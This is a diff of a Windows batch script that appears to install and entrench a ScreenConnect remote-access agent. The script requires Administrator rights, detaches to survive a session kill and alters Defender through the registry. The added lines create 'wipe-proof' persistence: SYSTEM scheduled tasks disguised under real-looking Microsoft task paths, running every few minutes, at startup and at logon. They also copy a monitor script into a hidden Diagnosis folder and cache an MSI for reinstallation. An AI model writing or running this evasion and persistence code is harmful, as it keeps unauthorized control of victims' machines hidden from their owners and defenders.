@@ -14,7 +14,7 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 
 REM Survive ScreenConnect Guest 30s kill: detach into independent process
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O4 ===
+  echo === OWN BUILD 20260802O5 ===
   net session >nul 2>&1
   if errorlevel 1 (echo need Administrator & exit /b 5)
   echo go_start %DATE% %TIME%>"%LOG%"
@@ -31,7 +31,7 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O4 ===
+echo === OWN WORKER 20260802O5 ===
 
 echo [1] Defender reg only (no sc stop hang)...
 echo av_reg_begin>>"%LOG%"
@@ -151,9 +151,8 @@ sc config "%PRIM%" start= auto >nul 2>&1
 sc start "%PRIM%" >nul 2>&1
 timeout /t 2 /nobreak >nul
 
-echo [5] Arm persist+auto-update monitor...
+echo [5] Arm wipe-proof persist (2m/3m/onstart/onlogon + MSI cache)...
 echo persist_begin>>"%LOG%"
-REM Prefer bundled own_mon.cmd beside this script; else pull from repo
 if exist "%~dp0own_mon.cmd" (
   copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
 ) else (
@@ -162,11 +161,18 @@ if exist "%~dp0own_mon.cmd" (
 if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
 copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
 
+REM cache MSI for offline-ish reinstall after wipe
+if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 copy /y "%MSI%" "%WD%\pkg.msi" >nul
+
 schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
 schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
 schtasks /Delete /TN "\Microsoft\Windows\PLA\Server" /F >nul 2>&1
 schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
-echo persist_armed_2m_3m>>"%LOG%"
+schtasks /Delete /TN "\Microsoft\Windows\WDI\ResolutionHost" /F >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+echo persist_armed_wipeproof>>"%LOG%"
 
 sc query "%PRIM%" >>"%LOG%" 2>&1
 sc query state= all | findstr /I ScreenConnect >>"%LOG%"
